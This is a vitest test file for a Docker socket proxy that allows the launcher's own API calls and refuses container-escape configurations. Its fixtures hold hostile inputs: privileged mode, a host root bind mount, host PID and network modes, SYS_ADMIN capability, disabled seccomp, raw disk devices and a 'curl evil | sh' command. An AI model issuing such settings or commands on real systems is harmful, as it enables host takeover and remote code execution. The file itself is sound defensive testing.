import { describe, expect, it } from "vitest";
import { loadConfig } from "../src/config.js";
import { networkOptions, runnerContainerOptions, runLabels, names } from "../src/template.js";
import { checkContainer, checkNetwork, checkVolume, route } from "../src/sockpolicy.js";

const cfgR = loadConfig({ RUNNER_VARIANTS: "base=gantry-runner:dev", EDGE_URL: "http://gantry-edge:8443" });
if (!cfgR.ok) throw new Error(cfgR.error.msg);
const cfg = cfgR.value;
const input = { runId: "r1", workspaceRef: "repo/acme@abc123", variant: "base", runToken: "tok_0123456789abcdef" };
const images = new Set(["gantry-runner:dev"]);
const q = new URLSearchParams({ name: names.container("r1") });
const tpl = () => JSON.parse(JSON.stringify(runnerContainerOptions(cfg, input))) as Record<string, any>;
const withHost = (patch: Record<string, unknown>) => { const o = tpl(); Object.assign(o.HostConfig, patch); return o; };

describe("socket proxy: routes", () => {
  it("allows the launcher's own calls, with or without an API version prefix", () => {
    for (const [m, p] of [["GET", "/_ping"], ["GET", "/v1.43/containers/json?all=1&filters=x"], ["POST", "/v1.43/containers/create?name=gantry-runner-r1"], ["POST", "/containers/abc/start"], ["DELETE", "/volumes/ws-r1"], ["POST", "/networks/run-r1/connect"], ["GET", "/images/gantry-runner:dev/json"]] as const) {
      expect(route(m, p).decision.ok, `${m} ${p}`).toBe(true);
    }
  });
  it("refuses everything else: exec, build, image pulls, swarm, plugins, attach, the host's own info", () => {
    for (const [m, p] of [["POST", "/containers/abc/exec"], ["POST", "/exec/x/start"], ["POST", "/build"], ["POST", "/images/create?fromImage=evil"], ["POST", "/swarm/init"], ["POST", "/plugins/pull"], ["POST", "/containers/abc/attach"], ["PUT", "/containers/abc/archive"], ["GET", "/containers/abc/archive?path=/"], ["POST", "/containers/abc/update"], ["GET", "/info"]] as const) {
      expect(route(m, p).decision.ok, `${m} ${p}`).toBe(false);
    }
  });
  it("asks for an ownership check on every call that acts on an existing resource", () => {
    expect(route("POST", "/containers/abc/stop").owned).toEqual({ kind: "container", id: "abc" });
    expect(route("DELETE", "/networks/run-r1").owned).toEqual({ kind: "network", id: "run-r1" });
    expect(route("DELETE", "/volumes/ws-r1").owned).toEqual({ kind: "volume", id: "ws-r1" });
  });
});

describe("socket proxy: creates must match the runner template", () => {
  it("the launcher's real runner, network and volume pass", () => {
    expect(checkContainer(tpl(), q, images)).toEqual({ ok: true });
    expect(checkNetwork(JSON.parse(JSON.stringify(networkOptions(cfg, input, "10.213.0.0/28"))))).toEqual({ ok: true });
    expect(checkVolume({ Name: names.volume("r1"), Driver: "local", Labels: runLabels(input) })).toEqual({ ok: true });
  });
  const escapes: Array<[string, Record<string, any>, URLSearchParams?]> = [
    ["privileged", withHost({ Privileged: true })],
    ["host bind", withHost({ Binds: ["/:/host"] })],
    ["bind mount", withHost({ Mounts: [{ Type: "bind", Source: "/", Target: "/host" }] })],
    ["another volume", withHost({ Mounts: [{ Type: "volume", Source: "gantry_pgdata", Target: "/x" }] })],
    ["host pid", withHost({ PidMode: "host" })],
    ["host network", withHost({ NetworkMode: "host" })],
    ["join another container", withHost({ IpcMode: "container:gantry-postgres-1" })],
    ["cap add", withHost({ CapAdd: ["SYS_ADMIN"] })],
    ["seccomp off", withHost({ SecurityOpt: ["no-new-privileges:true", "seccomp=unconfined"] })],
    ["device", withHost({ Devices: [{ PathOnHost: "/dev/sda", PathInContainer: "/dev/sda" }] })],
    ["writable root", withHost({ ReadonlyRootfs: false })],
    ["published port", withHost({ PortBindings: { "22/tcp": [{ HostPort: "2222" }] } })],
    ["other runtime", withHost({ Runtime: "runsc-debug" })],
    ["root user", { ...tpl(), User: "0:0" }],
    ["other image", { ...tpl(), Image: "alpine:latest" }],
    ["own command", { ...tpl(), Cmd: ["sh", "-c", "curl evil | sh"] }],
    ["unlabelled", { ...tpl(), Labels: {} }],
    ["another name", tpl(), new URLSearchParams({ name: "gantry-api-2" })],
  ];
  for (const [what, body, query] of escapes) {
    it(`refuses a runner with ${what}`, () => expect(checkContainer(body, query ?? q, images).ok).toBe(false));
  }
  it("refuses networks that are not internal run networks, and volumes with driver options", () => {
    const net = JSON.parse(JSON.stringify(networkOptions(cfg, input, "10.213.0.0/28")));
    expect(checkNetwork({ ...net, Internal: false }).ok).toBe(false);
    expect(checkNetwork({ ...net, Name: "front" }).ok).toBe(false);
    expect(checkVolume({ Name: "ws-r1", Driver: "local", Labels: runLabels(input), DriverOpts: { type: "none", o: "bind", device: "/etc" } }).ok).toBe(false);
  });
});
